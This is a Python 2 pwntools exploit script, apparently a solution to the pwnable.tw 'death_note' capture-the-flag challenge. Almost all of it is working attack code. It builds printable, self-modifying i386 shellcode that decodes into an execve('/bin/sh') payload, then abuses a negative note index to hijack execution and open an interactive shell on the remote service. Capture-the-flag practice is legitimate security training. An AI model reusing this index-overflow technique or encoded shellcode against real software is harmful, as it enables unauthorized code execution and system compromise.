#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

ready = True
if ready:
    conn = connect('chall.pwnable.tw', 10201)
else:
    conn = process(['/home/doublesine/Desktop/death_note'])

def connRead():
    sleep(1)
    read = conn.read()
    print read,
    return read

def connSendRaw(s):
    conn.send_raw(s)
    print s,

# +0
shellcode = asm('push 0x70707070')
shellcode += asm('push 0x70707070')
shellcode += asm('pop ecx')
shellcode += asm('sub byte ptr[eax + 36], cl')
shellcode += asm('sub byte ptr[eax + 45], cl')
shellcode += asm('sub byte ptr[eax + 47], cl')
shellcode += asm('sub byte ptr[eax + 49], cl')
shellcode += asm('sub dword ptr[eax + 51], ecx')
shellcode += asm('sub byte ptr[eax + 55], cl')
shellcode += asm('sub byte ptr[eax + 55], cl')
# +32
# the following shellcode is
# 
# shellcode = asm('push 0x%08x' % unpack('/sh\x00', 32))
# shellcode += asm('push 0x%08x' % unpack('/bin', 32))
# shellcode += asm('push esp')
# shellcode += asm('pop ebx')
# shellcode += asm('xor ecx, ecx')
# shellcode += asm('xor edx, edx')
# shellcode += asm('xor esi, esi')
# shellcode += asm('xor eax, eax')
# shellcode += asm('mov al, SYS_execve')
# shellcode += asm('int 0x80')
shellcode += '\x68\x2f\x73\x68'
# +36
shellcode += '\x70'
# +37
shellcode += '\x68\x2f\x62\x69\x6e\x54\x5b\x31'
# +45
shellcode += '\x39'
# +46
shellcode += '\x31'
# +47
shellcode += '\x42'
# +48
shellcode += '\x31'
# +49
shellcode += '\x66'
# +50
shellcode += '\x31'
# +51
shellcode += '\x30\x21\x7c\x3d'
# +55
shellcode += '\x60'

connRead()
connSendRaw('1\n')      # add note
connRead()
connSendRaw('0\n')      # input index
connRead()
connSendRaw('fuck\n')   # set content

connRead()
connSendRaw('3\n')      # delete note
connRead()
connSendRaw('0\n')      # input index

connRead()
connSendRaw('1\n')      # add note
connRead()
connSendRaw('-19\n')    # input index
connRead()
connSendRaw(shellcode + '\n')   # set content
raw_input('go go go')
connRead()
connSendRaw('3\n')      # delete note
connRead()
connSendRaw('-19\n')    # input index

conn.interactive()  # you will get shell here

